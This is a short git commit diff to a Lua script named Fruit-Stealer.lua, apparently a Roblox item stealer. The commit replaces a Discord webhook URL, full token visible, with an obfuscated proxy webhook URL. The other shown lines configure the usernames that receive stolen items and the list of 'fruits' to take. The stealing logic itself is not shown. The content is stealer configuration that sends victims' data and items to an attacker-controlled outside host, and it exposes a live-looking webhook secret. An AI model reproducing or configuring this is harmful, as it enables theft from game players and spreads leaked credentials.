deb965beed5b81cd5dc34b6f3c0d5d6b4104b0a5
uAreNobb <yashskelkar@gmail.com>
2025-04-10 05:56:23 +0530

    Update Fruit-Stealer.lua

--- Fruit-Stealer.lua
+++ Fruit-Stealer.lua
@@ -1,4 +1,4 @@
-Webhook = "https://discord.com/api/webhooks/1359679077056774354/0fsz95kgqqL6E_e5JavDIsQpNL5e-FcMBVQZjSrH1QPQNBxj3os_iAjW26kf5x4g3a04" -- << Your Webhook
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=WHR0dEhGclA4ZlNieFQtZEpZcTNDZzo0S1JkZTM3QmZTRUlWZ0ZVcEY2ZDFWM3ZSaE1DbnJUWnV5THFUaWtSZnFOSGxXSGZ1dUxVZXY5MXlNRjdVdmFLaFh1VzNLMWcxT1FkZlJldTJKV0xtc0tDRV9KYmZQVElfU0g4ck93bTJYWkVzaGx3WWIzUlppNTVDU1pMdUpWVUg4REhMS3c4REhTc2k1bUtiSnZ3LXF0OUV0ajlIZk5BbkU3VXlDc09yTW8" -- << Your Webhook
 Usernames = {"YSKTABAHI", "XR_TABAHIXD"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
